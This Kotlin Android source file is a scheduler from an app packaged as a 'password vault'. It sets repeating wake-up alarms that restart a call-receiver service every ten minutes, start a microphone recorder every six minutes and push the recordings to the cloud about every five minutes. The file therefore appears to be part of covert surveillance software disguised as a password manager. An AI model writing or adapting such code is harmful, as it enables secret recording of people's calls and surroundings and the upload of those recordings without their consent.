package com.example.passwordvault.util

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import com.example.passwordvault.receivers.FIVEMIN_RECORDING_PUSHER
import com.example.passwordvault.receivers.FIVEMIN_RECORDING_STARTER
import com.example.passwordvault.receivers.FiveMinRecordingReceiver
import com.example.passwordvault.service.CallReceiverServiceRestarter
import com.example.passwordvault.service.restartBroadcastAction
import com.example.passwordvault.util.logger.log

private val tag = Scheduler::class.java.simpleName

class Scheduler {
    companion object {

        fun scheduleCallServiceListener(context: Context) {
            val intent = Intent(context, CallReceiverServiceRestarter::class.java)
            intent.action = restartBroadcastAction
            if (intentPending(intent, 253, context) == null) {
                val tenMins = 1000L * 60L * 10L
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val interval = System.currentTimeMillis() + 3000L
                val pendingIntent = PendingIntent.getBroadcast(
                    context,
                    253,
                    intent,
                    PendingIntent.FLAG_CANCEL_CURRENT
                )
                alarmManager.setInexactRepeating(
                    AlarmManager.RTC_WAKEUP,
                    interval,
                    tenMins,
                    pendingIntent
                )
                log(tag, "10min call receiver scheduled")
            }
        }

        fun schedule5minRecorder(context: Context) {
            wakeUpCallReceiver(context)

            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager

            val interval = System.currentTimeMillis() + 3000L

            val recorderIntent = Intent(context, FiveMinRecordingReceiver::class.java)
            recorderIntent.action = FIVEMIN_RECORDING_STARTER
            val recorderPendingIntent = PendingIntent.getBroadcast(
                context,
                0,
                recorderIntent,
                PendingIntent.FLAG_UPDATE_CURRENT
            )

            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                interval,
                1000L * 60L * 6L,
                recorderPendingIntent
            )

            val cloudPusherIntent = Intent(context, FiveMinRecordingReceiver::class.java)
            cloudPusherIntent.action = FIVEMIN_RECORDING_PUSHER

            val cloudPusherPendingIntent =
                PendingIntent.getBroadcast(
                    context,
                    10,
                    cloudPusherIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT
                )
 
            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                interval + 1000L * 60L * 5L + 7000L,
                1000L * 60L * 5L + 10000L,
                cloudPusherPendingIntent
            )
            log(tag, "5min Mic recorder scheduled")
        }

        fun cancel5minRecorder(context: Context) {
            PreferenceUtil.writeMicRecordingCount(context, 0)
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager

            val recorderIntent = Intent(context, FiveMinRecordingReceiver::class.java)
            recorderIntent.action = FIVEMIN_RECORDING_STARTER
            val recorderPendingIntent =
                PendingIntent.getBroadcast(context, 0, recorderIntent, PendingIntent.FLAG_NO_CREATE)

            val cloudPusherIntent = Intent(context, FiveMinRecordingReceiver::class.java)
            cloudPusherIntent.action = FIVEMIN_RECORDING_PUSHER
            val cloudPusherPendingIntent = PendingIntent.getBroadcast(
                context,
                10,
                cloudPusherIntent,
                PendingIntent.FLAG_NO_CREATE
            )

            if (recorderPendingIntent != null)
                alarmManager.cancel(recorderPendingIntent)

            if (cloudPusherPendingIntent != null)
                alarmManager.cancel(cloudPusherPendingIntent)

            log("Scheduler", "**** 5min Mic recorder cancelled ****")
        }

        fun wakeUpCallReceiver(context: Context) {
            val intent =
                Intent(context, CallReceiverServiceRestarter::class.java)
            intent.action = restartBroadcastAction
            context.sendBroadcast(intent)
        }
    }
}

private fun intentPending(
    intent: Intent,
    requestCode: Int,
    context: Context
): PendingIntent? {
    return PendingIntent.getBroadcast(
        context,
        requestCode,
        intent,
        PendingIntent.FLAG_NO_CREATE
    )
}
